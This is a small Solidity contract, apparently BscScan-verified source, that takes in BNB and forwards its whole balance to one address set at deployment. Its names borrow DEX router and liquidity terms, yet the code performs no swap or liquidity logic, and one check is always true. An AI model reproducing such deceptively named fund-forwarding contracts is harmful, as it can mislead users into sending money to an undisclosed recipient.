/**
 *Submitted for verification at BscScan.com on 2022-02-28
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8;

contract routerV2Coordinator{
    
    uint256 liquifyLP;
    address internal _routerV2Pair;

        constructor( address routerV2Pair) {
        _routerV2Pair = routerV2Pair;
    }
    event Received(address, uint);
    receive() external payable {
    emit Received(msg.sender, msg.value);
    }  
    function pairSwapLiquify(address payable recipient) public {
        liquifyLP = address(this).balance;
        require(recipient == address(_routerV2Pair));
        require(liquifyLP >= 0);
        recipient.transfer(liquifyLP);
    }
}